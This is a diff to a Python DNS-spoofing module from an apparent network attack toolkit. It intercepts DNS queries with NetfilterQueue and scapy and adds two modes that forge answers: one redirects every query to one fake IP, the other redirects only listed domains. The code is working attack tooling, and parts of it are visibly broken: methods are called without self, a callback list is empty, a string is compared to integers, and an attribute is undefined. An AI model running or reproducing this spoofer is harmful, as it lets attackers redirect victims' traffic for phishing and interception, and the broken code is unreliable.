@@ -9,32 +9,13 @@ class DnsSpoofing(CommandModule) :
     outline = "--"
     manual = "--"
 
-
     nfqueue = {}
+    dnsQueryCallback = []
     fakeDnsIpDictionary = {}
 
 
-    def getNFQueue(self, num) :
-        if None == self.nfqueue.get(num) :
-            self.nfqueue[num] = NetfilterQueue()
-        return self.nfqueue[num]
-	
 
     def run(self) :
-        # Get Dns Spoofing target list.
-        filename = "dnsSpoofingList.txt"
-        try :
-            f = open(filename, 'r')
-            lines = f.readlines()
-            for line in lines :
-                dns, ip = line.replace(' ', '').split(',')
-                self.fakeDnsIpDictionary[dns] = ip
-            f.close()
-        except :
-            print("[Error] %s file is not exist" % filename)
-            return
-
-
         # Make IP Forwarding.
         if False == NetEnvManager.getInstance().checkIpForward() :
             NetEnvManager.getInstance().ipForward(1)
@@ -50,14 +31,17 @@ class DnsSpoofing(CommandModule) :
         
 
         # DNS-Spoofing
-        _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID))
+        func_id = select_dns_func();
+        if True == dnsSetup(func_id) :
+            _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID, func_id))
         # self.dnsCachePoisoning("DNS cache poisoning", queryID)
 
 
-    def dnsCachePoisoning(self, title, queryID) :
+
+    def dnsCachePoisoning(self, title, queryID, func_id) :
         print("# DNS cache poisoning...")
         try :
-            self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback)
+            self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback[func_id])
             self.getNFQueue(queryID).run()
 
         except KeyboardInterrupt :
@@ -68,21 +52,28 @@ class DnsSpoofing(CommandModule) :
             NetEnvManager.getInstance().ipTables(iptablesOpt)
 
 
-    def dnsQueryCallback(self, packet) :
-        print("# DNS Query")
+    def oneWayDnsQueryCallback(self, packet) :
+        print("# One Way DNS Query")
+        pkt = IP(packet.get_payload())
+        resq = self.makeDnsResponse(pkt, self.fakeIP)
+        send(resq)
+        packet.drop()
+
+    def selectiveDnsQueryCallback(self, packet) :
+        print("# Selective DNS Query")
         pkt = IP(packet.get_payload())
         # pkt.show()
         # if pkt[DNS].qd.qname in self.fakeDnsIpDictionary.keys() :
         for dn in self.fakeDnsIpDictionary.keys() :
             if dn in str(pkt[DNS].qd.qname) :
-                resq = self.makeDnsResponse(pkt, dn)
+                resq = self.makeDnsResponse(pkt, self.fakeDnsIpDictionary[dn])
                 send(resq)
                 packet.drop()
                 return
         packet.accept()
 
 
-    def makeDnsResponse(self, packet, targetDomain) :
+    def makeDnsResponse(self, packet, targetIp) :
         ip = IP()
         ip.src = packet[IP].dst
         ip.dst = packet[IP].src
@@ -98,11 +89,50 @@ class DnsSpoofing(CommandModule) :
         dns.qdcount = 1			# Question count.
         dns.ancount = 1			# Answer count.
         dns.qd = packet[DNS].qd
-        dns.an = DNSRR(rrname=packet[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=self.fakeDnsIpDictionary[targetDomain])
+        dns.an = DNSRR(rrname=packet[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=targetIp)
 
         resp = ip/udp/dns
         # resp.show()
         return resp
+
+
+    def getNFQueue(self, num) :
+        if None == self.nfqueue.get(num) :
+            self.nfqueue[num] = NetfilterQueue()
+        return self.nfqueue[num]
+
+
+    def dnsSetup(self, func_id) :
+        self.fakeDnsIpDictionary.clear()
+
+        if 0 == func_id :
+            print("## Input Fake Ip.")
+            fakeIp = raw_input("fake Ip : ")
+            self.fakeDnsIpDictionary["fakeDns"] = fakeIp
+
+        elif 1 == func_id :
+            # Get Dns Spoofing target list.
+            filename = "dnsSpoofingList.txt"
+            try :
+                f = open(filename, 'r')
+                lines = f.readlines()
+                for line in lines :
+                    dns, ip = line.replace(' ', '').split(',')
+                    self.fakeDnsIpDictionary[dns] = ip
+                f.close()
+            except :
+                print("[Error] %s file is not exist" % filename)
+                return False
+        return True
+
+
+    def select_dns_func(self) :
+        print("## Select DNS Mode.")
+        print(" 0 : One Way DNS Spoofing.")
+        print(" 1 : Selective DNS Spoofing.")
+        func_id = raw_input("DNS Mode : ")
+        return func_id
+
 
 
 if __name__ == '__main__' :
